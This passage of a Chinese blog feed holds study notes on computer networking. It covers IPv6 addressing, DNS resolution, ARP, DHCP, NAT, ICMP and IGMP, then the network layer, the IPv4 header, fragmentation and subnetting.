数据包转发到了目标主机。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604685.png"alt="image-20240511145038639" /><figcaption aria-hidden="true">image-20240511145038639</figcaption></figure><blockquote><p>环回地址是在同一台计算机上的程序之间进行网络通信时所使用的一个默认地址。计算机使用一个特殊的IP 地址 <strong>127.0.0.1作为环回地址</strong>。与该地址具有相同意义的是一个叫做<code>localhost</code> 的主机名。使用这个 IP或主机名时，数据包不会流向网络。</p></blockquote><h2 id="ipv6">2.7 IPv6</h2><h3 id="首部">2.7.1 首部</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604686.png"alt="image-20240511150934771" /><figcaption aria-hidden="true">image-20240511150934771</figcaption></figure><p>IPv6 相比 IPv4 的首部改进：</p><ul><li><strong>取消了分片/重组相关字段。</strong>分片与重组是耗时的过程，IPv6不允许在中间路由器进行分片与重组，这种操作只能在源与目标主机进行，大大提高了路由器转发的速度。</li><li><strong>取消了首部校验和字段。</strong>因为在数据链路层和传输层都会校验，因此 IPv6 直接取消了 IP 的校验。</li><li><strong>取消选项字段。</strong> 选项字段不再是标准 IP首部的一部分了，但它并没有消失，而是可能出现在 IPv6首部中的「下一个首部」指出的位置上。删除该选项字段使的 IPv6的首部成为固定长度的 <code>40</code> 字节。</li></ul><h3 id="地址标识方式">2.7.2 地址标识方式</h3><p>IPv4 地址长度共 32 位，是以每 8位作为一组，并用点分十进制的表示方式。IPv6 地址长度是 128 位，是以每 16位作为一组，每组用冒号<code>:</code> 隔开。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604687.png"alt="image-20240511151537768" /><figcaption aria-hidden="true">image-20240511151537768</figcaption></figure><p>如果出现连续的 0 时还可以将这些 0省略，并用两个冒号<code>::</code>隔开。但是，一个 IP地址中只允许出现一次两个连续的冒号。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604688.png"alt="image-20240511151613986" /><figcaption aria-hidden="true">image-20240511151613986</figcaption></figure><h3 id="地址结构">2.7.3 地址结构</h3><ul><li>单播地址，用于一对一的通信</li><li>组播地址，用于一对多的通信</li><li>任播地址，用于通信最近的节点，最近的节点是由路由协议决定</li><li>没有广播地址</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604689.png"alt="image-20240511151924056" /><figcaption aria-hidden="true">image-20240511151924056</figcaption></figure><h3 id="单播地址类型">2.7.4 单播地址类型</h3><p>对于一对一通信的 IPv6地址，主要划分了三类单播地址，每类地址的有效范围都不同。</p><ul><li>在同一链路单播通信，不经过路由器，可以使用<strong>链路本地单播地址</strong>，IPv4没有此类型</li><li>在内网里单播通信，可以使用<strong>唯一本地地址</strong>，相当于 IPv4的私有 IP</li><li>在互联网通信，可以使用<strong>全局单播地址</strong>，相当于 IPv4的公有 IP</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604690.png"alt="image-20240511152051274" /><figcaption aria-hidden="true">image-20240511152051274</figcaption></figure><h3 id="优点-1">2.7.5 优点</h3><ul><li><strong>即插即用</strong>：IPv6 可自动配置，没有 DHCP服务器也可以实现自动分配IP地址。</li><li><strong>传输性能</strong>：IPv6 首部长度固定 <code>40</code>字节，删除首部校验和，简化首部结构，减轻了路由器负荷，提高了传输的性能。</li><li><strong>安全性</strong>：IPv6 有应对伪造 IP地址的网络安全功能以及防止线路窃听的功能。</li></ul><h1 id="ip协议相关技术">3. IP协议相关技术</h1><h2 id="dns">3.1 DNS</h2><p><strong>DNS 域名解析</strong>：将域名网址自动转换为具体的 IP地址。</p><h3 id="域名层级关系">3.1.1 域名层级关系</h3><p>DNS 中的域名都是用<strong>句点</strong>来分隔的，比如<code>www.server.com</code>，这里的句点代表了不同层次之间的<strong>界限</strong>。在域名中，<strong>越靠右</strong>的位置表示其层级<strong>越高</strong>。域名的层级关系类似一个树状结构：</p><ul><li>根 DNS 服务器</li><li>顶级域 DNS 服务器（com）</li><li>权威 DNS 服务器（server.com）</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604691.png"alt="image-20240511152414167" /><figcaption aria-hidden="true">image-20240511152414167</figcaption></figure><p>根域的 DNS 服务器信息保存在互联网中所有的 DNS服务器中。客户端只要能够找到任意一台 DNS 服务器，就可以通过它找到根域DNS 服务器，然后再一路顺藤摸瓜找到位于下层的某台目标 DNS 服务器。</p><h3 id="域名解析流程">3.1.2 域名解析流程</h3><p>浏览器首先查看自己的缓存，如果没有再查看操作系统的缓存，还没有就查看本机域名解析文件<code>hosts</code>，如果还是没有，就会向 DNS服务器进行查询，查询的过程如下：</p><ol type="1"><li>客户端首先会发出一个 DNS 请求，问 <code>www.server.com</code>的 IP是啥，并发给本地 DNS 服务器；</li><li>本地域名服务器收到客户端的请求后，如果缓存里能找到<code>www.server.com</code>，则它直接返回 IP 地址；如果没有，本地 DNS会去问它的根域名服务器：“老大， 能告诉我 <code>www.server.com</code> 的IP 地址吗？”根域名服务器是最高层次的，它不直接用于域名解析，但能指明一条道路。</li><li>根 DNS 收到来自本地 DNS 的请求后，发现后置是.com，说：“<code>www.server.com</code> 这个域名归 .com 区域管理”，我给你.com 顶级域名服务器地址给你，你去问问它吧。”</li><li>本地 DNS 收到顶级域名服务器的地址后，发起请求问“老二， 你能告诉我<code>www.server.com</code> 的 IP 地址吗？”</li><li>顶级域名服务器说：“我给你负责 <code>www.server.com</code> 区域的权威DNS 服务器的地址，你去问它应该能问到”。</li><li>本地 DNS 于是转向问权威 DNS服务器：“老三，<code>www.server.com</code>对应的IP是啥呀？” server.com的权威 DNS服务器，它是域名解析结果的原出处。为啥叫权威呢？就是我的域名我做主。</li><li>权威 DNS 服务器查询后将对应的 IP 地址 X.X.X.X 告诉本地 DNS。</li><li>本地 DNS 再将 IP 地址返回客户端，客户端和目标建立连接。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604692.png"alt="image-20240511152721334" /><figcaption aria-hidden="true">image-20240511152721334</figcaption></figure><h2 id="arp">3.2 ARP</h2><p>在传输一个 IP 数据报的时候，确定了源 IP 地址和目标 IP地址后，就会通过主机「路由表」确定 IP数据包下一跳。网络层的下一层是数据链路层，所以我们还要知道「下一跳」的MAC 地址。由于主机的路由表中可以找到下一跳的 IP 地址，所以可以通过<strong>ARP 协议</strong>，求得下一跳的 MAC 地址。</p><h3 id="工作流程">3.2.1 工作流程</h3><p>ARP 是借助 <strong>ARP 请求与 ARP 响应</strong>两种类型的包确定 MAC地址的。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604693.png"alt="image-20240511153208897" /><figcaption aria-hidden="true">image-20240511153208897</figcaption></figure><ul><li>主机会通过<strong>广播发送 ARP请求</strong>，这个包中包含了想要知道的 MAC 地址的主机 IP 地址。</li><li>当同个链路中的所有设备收到 ARP 请求时，会去拆开 ARP请求包里的内容，如果 ARP 请求包中的目标 IP 地址与自己的 IP地址一致，那么这个设备就将自己的 MAC 地址置入<strong>ARP响应包</strong>返回给主机。</li></ul><p>操作系统通常会把第一次通过 ARP 获取的 MAC地址缓存起来，以便下次直接从缓存中找到对应 IP 地址的 MAC 地址。不过，MAC地址的缓存是有一定期限的，超过这个期限，缓存的内容将被清除。</p><h3 id="rarp">3.2.2 RARP</h3><p>RARP 协议：<strong>已知 MAC 地址求 IP地址</strong>。例如将打印机服务器等小型嵌入式设备接入到网络时就经常会用得到。通常这需要架设一台<code>RARP</code> 服务器，在这个服务器上注册设备的 MAC 地址及其 IP地址。然后再将这个设备接入到网络，接着：</p><ul><li>该设备会发送一条「我的 MAC地址是XXXX，请告诉我，我的IP地址应该是什么」的请求信息。</li><li>RARP 服务器接到这个消息后返回「MAC地址为 XXXX 的设备，IP地址为XXXX」的信息给这个设备。</li></ul><p>最后，设备就根据从 RARP 服务器所收到的应答信息设置自己的 IP地址。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604694.png"alt="image-20240511153422319" /><figcaption aria-hidden="true">image-20240511153422319</figcaption></figure><h2 id="dhcp">3.3 DHCP</h2><h3 id="工作流程-1">3.3.1 工作流程</h3><p>说明：DHCP 客户端进程监听的是 68 端口号，DHCP 服务端进程监听的是 67端口号。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604695.png"alt="image-20240511153538741" /><figcaption aria-hidden="true">image-20240511153538741</figcaption></figure><ul><li>客户端首先发起 <strong>DHCP 发现报文（DHCP DISCOVER）</strong> 的 IP数据报，由于客户端没有 IP 地址，也不知道 DHCP 服务器的地址，所以使用的是UDP <strong>广播</strong>通信，其使用的广播目的地址是255.255.255.255（端口 67） 并且使用 0.0.0.0（端口 68） 作为源 IP地址。DHCP 客户端将该 IP数据报传递给链路层，链路层然后将帧广播到所有的网络中设备。</li><li>DHCP 服务器收到 DHCP 发现报文时，用 <strong>DHCP 提供报文（DHCPOFFER）</strong> 向客户端做出响应。该报文仍然使用 IP 广播地址255.255.255.255，该报文信息携带服务器提供可租约的 IP地址、子网掩码、默认网关、DNS 服务器以及 IP 地址租用期。</li><li>客户端收到一个或多个服务器的 DHCP提供报文后，从中选择一个服务器，并向选中的服务器发送 <strong>DHCP请求报文（DHCP REQUEST</strong>进行响应，回显配置的参数。</li><li>最后，服务端用 <strong>DHCP ACK 报文</strong>对 DHCP请求报文进行响应，应答所要求的参数。</li></ul><p>一旦客户端收到 DHCP ACK后，交互便完成了，并且客户端能够在租用期内使用 DHCP 服务器分配的 IP地址。如果租约的 DHCP IP 地址快期后，客户端会向服务器发送 DHCP请求报文：</p><ul><li>服务器如果同意继续租用，则用 DHCP ACK报文进行应答，客户端就会延长租期。</li><li>服务器如果不同意继续租用，则用 DHCP NACK报文，客户端就要停止使用租约的 IP 地址。</li></ul><h3 id="中继代理">3.3.2 中继代理</h3><p>DHCP 交互中，全程都是使用 <strong>UDP 广播</strong>通信。那么如果DHCP服务器和客户端不是在同一个局域网内，路由器又不会转发广播包，那不是每个网络都要配一个DHCP 服务器？为了解决这一问题，就出现了 <strong>DHCP中继代理</strong>。有了 DHCP 中继代理以后，对不同网段的 IP地址分配也可以由一个 DHCP 服务器统一进行管理。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604696.png"alt="image-20240511154200490" /><figcaption aria-hidden="true">image-20240511154200490</figcaption></figure><ul><li>DHCP 客户端会向 DHCP 中继代理发送 DHCP 请求包，而 DHCP中继代理在收到这个广播包以后，再以<strong>单播</strong>的形式发给 DHCP服务器。</li><li>服务器端收到该包以后再向 DHCP 中继代理返回应答，并由 DHCP中继代理将此包广播给 DHCP 客户端 。</li></ul><h2 id="nat">3.4 NAT</h2><h3 id="工作流程-2">3.4.1 工作流程</h3><p>NAT：网络地址转换。缓解了 IPv4 地址耗尽的问题。简单的来说 NAT就是公司、家庭、教室内的主机对外部通信时，把私有 IP 地址转换成公有 IP地址。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604697.png"alt="image-20240511154612220" /><figcaption aria-hidden="true">image-20240511154612220</figcaption></figure><h3 id="napt">3.4.2 NAPT</h3><p>普通的 NAT 转换没什么意义。由于绝大多数的网络应用都是使用传输层协议TCP 或 UDP 来传输数据的。因此，可以把 IP 地址 +端口号一起进行转换。这样，就用一个全球 IP地址就可以了，这种转换技术就叫<strong>NAPT（网络地址与端口转换）</strong>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604698.png"alt="image-20240511154824243" /><figcaption aria-hidden="true">image-20240511154824243</figcaption></figure><p>图中有两个客户端 192.168.1.10 和 192.168.1.11 同时与服务器183.232.231.172 进行通信，并且这两个客户端的本地端口都是1025。此时，<strong>两个私有 IP 地址都转换 IP 地址为公有地址120.229.175.121，但是以不同的端口号作为区分。</strong>于是，生成一个NAPT 路由器的转换表，就可以正确地转换地址跟端口的组合，令客户端 A、B能同时与服务器之间进行通信。这种转换表在 NAT 路由器上自动生成。例如，在TCP 的情况下，建立 TCP 连接首次握手时的 SYN包一经发出，就会生成这个表。而后又随着收到关闭连接时发出 FIN包的确认应答从表中被删除。</p><h3 id="潜在问题">3.4.3 潜在问题</h3><ul><li>外部无法主动与 NAT 内部服务器建立连接，因为 NAPT转换表没有转换记录。</li><li>转换表的生成与转换操作都会产生性能开销。</li><li>通信过程中，如果 NAT 路由器重启了，所有的 TCP 连接都将被重置。</li></ul><h3 id="解决方案">3.4.4 解决方案</h3><ul><li>使用IPv6</li><li>穿透技术：让网络应用程序主动发现自己位于 NAT设备之后，并且会主动获得 NAT 设备的公有IP，并为自己建立端口映射条目，注意这些都是NAT设备后的应用程序自动完成的。也就是说，在 NAT穿透技术中，NAT设备后的应用程序处于主动地位，它已经明确地知道 NAT设备要修改它外发的数据包，于是它主动配合 NAT设备的操作，主动地建立好映射，这样就不像以前由 NAT设备来建立映射了。</li></ul><h2 id="icmp">3.5 ICMP</h2><p>ICMP 全称是 <strong>Internet Control MessageProtocol</strong>，也就是<strong>互联网控制报文协议</strong>。当遇到问题的时候，需要传出消息，报告遇到了什么问题，这样才可以调整传输策略，以此来控制整个局面。</p><h3 id="功能">3.5.1 功能</h3><p>确认 IP 包是否成功送达目标地址、报告发送过程中 IP包被废弃的原因和改善网络设置等。在 IP 通信中如果某个 IP包因为某种原因未能达到目标地址，那么这个具体的原因将由 ICMP负责通知。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604700.png"alt="image-20240511155427661" /><figcaption aria-hidden="true">image-20240511155427661</figcaption></figure><p>如上图例子，主机 <code>A</code> 向主机 <code>B</code>发送了数据包，由于某种原因，途中的路由器 <code>2</code> 未能发现主机<code>B</code> 的存在，这时，路由器 <code>2</code> 就会向主机<code>A</code> 发送一个 <code>ICMP</code> 目标不可达数据包，说明发往主机<code>B</code> 的包未能成功。ICMP 的这种通知消息会使用 <code>IP</code>进行发送 。因此，从路由器 <code>2</code> 返回的 ICMP包会按照往常的路由控制先经过路由器 <code>1</code> 再转发给主机<code>A</code> 。收到该 ICMP 包的主机 <code>A</code> 则分解 ICMP的首部和数据域以后得知具体发生问题的原因。</p><h3 id="类型">3.5.2 类型</h3><ul><li><strong>查询报文类型</strong>：用于诊断的查询消息</li><li><strong>差错报文类型</strong>：通知出错原因的错误消息</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604701.png"alt="image-20240511155602370" /><figcaption aria-hidden="true">image-20240511155602370</figcaption></figure><h2 id="igmp">3.6 IGMP</h2><p>组播中只有一组的主机能收到数据包，不在一组的主机不能收到数组包，怎么管理是否是在一组呢？那么，就需要<code>IGMP</code> 协议了。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604702.png"alt="image-20240511155755849" /><figcaption aria-hidden="true">image-20240511155755849</figcaption></figure><p>IGMP是因特网组管理协议，工作在主机（组播成员）和最后一跳路由之间，如上图中的蓝色部分。</p><ul><li>IGMP报文向路由器申请加入和退出组播组，默认情况下路由器是不会转发组播包到连接中的主机，除非主机通过IGMP 加入到组播组，主机申请加入到组播组时，路由器就会记录 IGMP路由器表，路由器后续就会转发组播包到对应的主机了。</li><li>IGMP 报文采用 IP 封装，IP 头部的协议号为 2，而且 TTL 字段值通常为1，因为 IGMP 是工作在主机与连接的路由器之间。</li></ul><h3 id="常规查询与响应工作机制">3.6.1 常规查询与响应工作机制</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604703.png"alt="image-20240511160025570" /><figcaption aria-hidden="true">image-20240511160025570</figcaption></figure><ol type="1"><li>路由器会周期性发送目的地址为<code>224.0.0.1</code>（表示同一网段内所有主机和路由器） <strong>IGMP常规查询报文</strong>。</li><li>主机1 和 主机 3收到这个查询，随后会启动「报告延迟计时器」，计时器的时间是随机的，通常是0~10 秒，计时器超时后主机就会发送 <strong>IGMP成员关系报告报文</strong>（源 IP 地址为自己主机的 IP 地址，目的 IP地址为组播地址）。如果在定时器超时之前，收到同一个组内的其他主机发送的成员关系报告报文，则自己不再发送，这样可以减少网络中多余的IGMP 报文数量。</li><li>路由器收到主机的成员关系报文后，就会在 IGMP路由表中加入该组播组，后续网络中一旦该组播地址的数据到达路由器，它会把数据包转发出去。</li></ol><h3 id="离开组播组工作机制">3.6.2 离开组播组工作机制</h3><p>情况一，网段中仍有该组播组：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604704.png"alt="image-20240511160302245" /><figcaption aria-hidden="true">image-20240511160302245</figcaption></figure><ol type="1"><li>主机 1 要离开组 224.1.1.1，发送 IGMPv2 离组报文，报文的目的地址是224.0.0.2（表示发向网段内的所有路由器）</li><li>路由器 收到该报文后，以 1 秒为间隔连续发送 IGMP特定组查询报文（共计发送 2 个），以便确认该网络是否还有 224.1.1.1组的其他成员。</li><li>主机 3 仍然是组 224.1.1.1的成员，因此它立即响应这个特定组查询。路由器知道该网络中仍然存在该组播组的成员，于是继续向该网络转发224.1.1.1 的组播数据包。</li></ol><p>情况二，网段中没有该组播组：</p><figure><img src="IP篇.assets/image-20240511160414739.png"alt="image-20240511160414739" /><figcaption aria-hidden="true">image-20240511160414739</figcaption></figure><ol type="1"><li>主机 1 要离开组播组 224.1.1.1，发送 IGMP 离组报文。</li><li>路由器收到该报文后，以 1 秒为间隔连续发送 IGMP特定组查询报文（共计发送 2 个）。此时在该网段内，组 224.1.1.1已经没有其他成员了，因此没有主机响应这个查询。</li><li>一定时间后，路由器认为该网段中已经没有 224.1.1.1组播组成员了，将不会再向这个网段转发该组播地址的数据包。</li></ol><p><strong>参考资料：</strong></p><ol type="1"><li>图解网络：https://xiaolincoding.com/network</li><li>Linux系统(五)网卡、IP地址、以及SSH、Vncserver、SCP相关网络操作：https://blog.csdn.net/weixin_39059031/article/details/108174812</li><li>什么是 CIDR？https://aws.amazon.com/cn/what-is/cidr/</li></ol>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>计算机网络</category>
      
      <category>图解网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网络层</title>
    <link href="/2024/05/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
    <url>/2024/05/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">1. 简介</h1><h2 id="网络层">1.1 网络层</h2><ul><li>发送方：将<strong>报文段</strong>封装为<strong>数据报</strong></li><li>接收方：将<strong>报文段</strong>传送到传输层</li><li>每个主机、路由器中都有网络层协议</li><li>路由器检查通过它的所有 IP 数据报的头部字段</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606934.png"alt="image-20240508130259379" /><figcaption aria-hidden="true">image-20240508130259379</figcaption></figure><h2 id="路由和转发">1.2 路由和转发</h2><ul><li>forwarding（转发）：当一个分组到达某路由器的一条<strong>输入链路</strong>时，该路由器必须将该分组移动到适合的<strong>输出链路</strong>。</li><li>routing（路由）：确定分组从源到目的地的路由或路径。</li><li>每台路由器都有一个转发表，通过检查到达分组首部的一个或多个字段值进行转发，使用这些首部值在转发表中索引。路由算法决定了路由器转发表中的值。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738556.png"alt="image-20240507140416607" /><figcaption aria-hidden="true">image-20240507140416607</figcaption></figure><h2 id="连接建立">1.3 连接建立</h2><ul><li>某些网络架构中的第三种重要的网络层功能：<ul><li>连接建立（连接建立）</li><li>ATM、帧中继、X.25、MPLS（非因特网）</li></ul></li><li>在数据报流动之前，两台终端<strong>主机</strong>和中间<strong>路由器</strong>建立虚拟连接。（注：TCP只需要通信双方）</li><li>网络层与传输层连接服务：<ul><li>网络层：两个主机之间</li><li>传输层：两个进程之间</li></ul></li></ul><h2 id="网络层服务模型">1.4 网络层服务模型</h2><ul><li>单个数据报的服务示例：<ul><li>确保交付</li><li>具有时延上界</li></ul></li><li>数据报流服务示例：<ul><li>有序分组交付</li><li>确保最小带宽</li><li>确保最大时延抖动</li><li>安全性</li></ul></li><li>因特网的网络层仅提供尽力而为服务（无服务）</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738557.png"alt="image-20240507141531061" /><figcaption aria-hidden="true">image-20240507141531061</figcaption></figure><h1 id="虚电路和数据报网络">2. 虚电路和数据报网络</h1><h2 id="网络层有连接和无连接服务">2.1 网络层有连接和无连接服务</h2><p>分组交换网络的类型：</p><ul><li>数据报网络（如因联网）：提供网络层无连接服务</li><li>VC 网络（如 ATM、帧中继、X.25、MPLS）：提供网络层有连接服务</li></ul><p>传输层服务和网络层服务：</p><table><thead><tr class="header"><th></th><th>传输层</th><th>网络层</th></tr></thead><tbody><tr class="odd"><td>服务</td><td>进程到进程</td><td>主机到主机</td></tr><tr class="even"><td>选择</td><td>两者都有</td><td>无连接或有连接</td></tr><tr class="odd"><td>实现</td><td>终端系统</td><td>网络核心和终端系统</td></tr></tbody></table><h2 id="虚电路网络">2.2 虚电路网络</h2><ul><li>VC（virtual circuit）组成：<ul><li>从源到目的地的路径（链路和路由器）</li><li>VC号码：路径上每条链路都有一个编号</li><li>路径上路由器转发表中的条目</li></ul></li><li>VC中每个分组都有VC号码，而不是IP地址。</li><li>VC 号码在每条链路上可能不同，新 VC 号码来自转发表。</li></ul><h3 id="转发表">2.2.1 转发表</h3><p>路由器维护连接状态信息！</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738558.png"alt="image-20240507143815504" /><figcaption aria-hidden="true">image-20240507143815504</figcaption></figure><h3 id="vc建立">2.2.2 VC建立</h3><ul><li>发送方传输层与网络层联系，指定接收方地址，等待网络建立 VC；</li><li>网络层确定发送方和接收方之间的路径，即 VC的所有数据包将经过的一系列链路和路由器。指定源和目的地之间的所有数据包都将走<strong>相同</strong>的路径；</li><li>网络层确定路径上每个链路的 VC 号码；</li><li>网络层在每个路由器的转发表中添加一个条目。</li></ul><h3 id="信令协议">2.2.3 信令协议</h3><ul><li>signaling message（信令报文）：端系统向网络发送指示虚电路启动与终止的报文，以及路由器间传递的用于建立虚电路的报文。</li><li>signaling protocols（信令协议）：用于交换这些报文的协议。</li><li>用于设置、维护和终止 VC ；用于 ATM、帧中继、X.25未用于当今因特网。</li></ul><h3 id="区别">2.2.4 区别</h3><p>网络层的 VC 建立与传输层的连接建立之间的区别：</p><ul><li>传输层的连接建立只涉及两终端系统<ul><li>两终端系统单独决定传输层连接的参数</li><li>两终端系统知道传输层连接，路由器完全不知道</li></ul></li><li>VC 网络层，两终端系统之间路径上的路由器参与 VC 建立<ul><li>每个路由器完全知道经过它的所有 VC</li></ul></li></ul><h2 id="数据报网络">2.3 数据报网络</h2><ul><li>无连接建立，路由器不维护任何状态信息；</li><li>分组使用目标主机地址，从而进行转发；</li><li>同一源——目的地址对之间的数据包可能会走<strong>不同</strong>的路径。</li></ul><h3 id="转发表-1">2.3.1 转发表</h3><p>40 亿个 IP 地址，因此与其列出单个目标地址，不如列出地址范围。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738559.png"alt="image-20240507150414821" /><figcaption aria-hidden="true">image-20240507150414821</figcaption></figure><h3 id="最长前缀匹配">2.3.2 最长前缀匹配</h3><p>在表中寻找最长的匹配项，并向与最长前缀匹配相关联的链路接口转发。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738560.png"alt="image-20240507150917163" /><figcaption aria-hidden="true">image-20240507150917163</figcaption></figure><h1 id="路由器的内部结构">3. 路由器的内部结构</h1><p>路由器的两个关键功能：</p><ul><li>运行路由算法/协议（RIP、OSPF、BGP）</li><li>将数据报从传入链路转发到传出链路</li></ul><p>组成部分：</p><ul><li>输入端口</li><li>交换结构</li><li>输出端口</li><li>路由选择处理器</li></ul><h1 id="ipinternet-protocol">4. IP：Internet Protocol</h1><h2 id="数据报格式">4.1 数据报格式</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403261556795.png"alt="image-20240326153007990" /><figcaption aria-hidden="true">image-20240326153007990</figcaption></figure><ul><li><p><strong>版本</strong> : 有 4（IPv4）和 6（IPv6）两个值；</p></li><li><p><strong>首部长度</strong> : 占 4 位，因此最大值为 15。值为 1表示的是 1 个 32 位字的长度，也就是 4 字节。因为固定部分长度为 20字节，因此该值最小为 5。如果可选字段的长度不是 4字节的整数倍，就用尾部的填充部分来填充。</p></li><li><p><strong>区分服务</strong> :用来获得更好的服务，一般情况下不使用。</p></li><li><p><strong>总长度</strong> :包括<strong>首部长度和数据部分长度</strong>。</p></li><li><p><strong>标识</strong> :在数据报长度过长从而发生分片的情况下，相同数据报的不同分片具有相同的标识符。</p></li><li><p><strong>片偏移</strong> :和标识符一起，用于发生分片的情况。片偏移的单位为 8 字节。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403261556796.png"alt="image-20240326153226709" /><figcaption aria-hidden="true">image-20240326153226709</figcaption></figure></li><li><p><strong>生存时间</strong>：TTL，它的存在是为了防止无法交付的数据报在互联网中不断兜圈子。以<strong>路由器跳数</strong>为单位，当TTL 为 0 时就丢弃数据报。</p></li><li><p><strong>协议</strong>：指出携带的数据应该上交给哪个协议进行处理，例如 ICMP、TCP、UDP等。</p></li><li><p><strong>首部检验和</strong>：数据报每经过一个路由器，都要<strong>重新计算</strong>检验和，因为TTL字段值会变，选项字段也可能会变。因此检验和<strong>不包含数据部分</strong>可以减少计算的工作量。</p></li></ul><blockquote><p>Q：为什么 TCP/IP 在传输层和网络层都进行错误检查？</p><p>A：IP层的校验和只针对IP头部进行校验，Segment数据在传输层进行校验。IP和TCP/UDP可能属于不同的协议栈。</p></blockquote><h3 id="比较长度字段">4.1.1 比较：长度字段</h3><ul><li>UDP：<ul><li>头部字段固定为8个字节</li><li>长度字段（16 位）：UDP 报文段的字节数（头部+数据）</li></ul></li><li>TCP：<ul><li>头部字段典型长度为20个字节 （当option字段为空时）</li><li>头部长度字段（4 位）：包括选项字段在内的 TCP 报头长度，以 32位字衡量（以 4 个字节为基本单位）</li></ul></li><li>IP（IPv4）：<ul><li>头部字段典型长度为20个字节（当option字段为空时）</li><li>首部长度字段（4 位）：包括选项字段在内的头部长度（以 4个字节为基本单位）</li><li>总长度字段（16 位）：IP数据报的总长度，以字节为单位（头部+数据）</li></ul></li></ul><h3 id="ip分片重组">4.1.2 IP分片重组</h3><ul><li>MTU (max transferunit，最大传输单元)：链路层帧能携带的最大数据报长度。<ul><li>不同的链路类型，不同的 MTU</li><li>以太网帧 MTU=1500 字节，某些广域链路帧的传输量不超过 576 字节</li></ul></li><li>MSS（maximum segmentsize，最大报文段长度)：传输层能承载的应用层最大数据长度，不包括传输层的头部。</li><li>例如：一个在以太网上传输的IPv4TCP报文的MSS值为1460，是由MTU=1500bytes减去IPv4 Header（20 Byte）和TCPheader（20 Byte）得到。</li><li>问题：路由上的每条链路可以使用不同的链路层协议，可以有不同的 MTU。</li><li>大型 IP 数据报在网络内被分片：<ul><li>一个数据报变成多个数据报</li><li>仅在目的地重组</li><li>IP 头比特用于识别相关分片并对其进行排序</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738561.png"alt="image-20240507154548566" /><figcaption aria-hidden="true">image-20240507154548566</figcaption></figure><h2 id="ipv4寻址">4.2 IPv4寻址</h2><h3 id="简介-1">4.2.1 简介</h3><ul><li>IP 地址：主机、路由器接口的 32 位标识符，2^32 个可能的 IP 地址 (40亿)。</li><li>接口：主机/路由器与物理链路之间的边界。<ul><li>路由器通常有多个接口</li><li>主机通常有一个或两个接口（如有线以太网、无线802.11）</li></ul></li><li>IP地址和一个接口相关联，而不是与包括该接口的主机或路由器相关联。</li></ul><h3 id="子网">4.2.2 子网</h3><ul><li>IP地址子网部分相同的设备接口，可以在没有中间路由器参与的情况下物理地相互连接。</li><li>要确定子网，将每个接口与其主机或路由器分离，创建孤立的网络孤岛。每一个网络孤岛叫作子网。</li><li>子网：223.1.1.0/24<ul><li>/24 表示子网掩码：11111111 11111111 11111111 00000000 =255.255.255.255.0</li><li>子网网络地址：223.1.1.0（计算方式：IP地址&amp;子网掩码）</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738562.png"alt="image-20240507160701060" /><figcaption aria-hidden="true">image-20240507160701060</figcaption></figure><h3 id="计算">4.2.3 